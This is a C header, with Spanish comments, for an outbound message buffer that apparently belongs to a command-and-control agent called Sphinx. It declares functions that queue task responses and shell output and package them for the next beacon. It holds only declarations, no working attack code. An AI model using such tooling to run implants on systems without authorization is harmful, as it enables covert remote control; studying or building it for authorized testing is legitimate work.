#ifndef SPHINX_OUTBOUND_H
#define SPHINX_OUTBOUND_H

#include <stdint.h>

#define OUTBOUND_INITIAL_CAP 16384   /* 16 KB de arranque */

typedef struct {
    uint8_t* data;    /* bloque con los mensajes serializados*/
    size_t   len;     /* bytes ocupados dentro de data */
    size_t   cap;     /* capacidad total reservada de data */
    uint32_t count;   /* numero de mensajes encolados */
} Outbound;

void out_reset(void); // len=5, count=0 (reutiliza data, no la libera)
int out_have_data(void); // 1 si count > 0
// Funcion privada: static int out_ensure(size_t extra); -> aumenta el buffer si es necesario

uint8_t* out_take( size_t* total_len); // rellena header, devuelve data, aloca un data nuevo vacio para el proximo beacon
void out_add_raw(const uint8_t* data, size_t n); // append de un bloque data
// serializa un 0xA4 (usa pack_task_response) y lo append
void out_add_task_response(const char* uuid, const uint8_t* data, size_t n, uint8_t status);
// serializa [0xDA][task_uuid(36)][message_type(1)][len(4)][data] y hace append
void out_add_shell_data(const char* task_uuid, uint8_t message_type, const uint8_t* data, size_t n);

#endif //SPHINX_OUTBOUND_H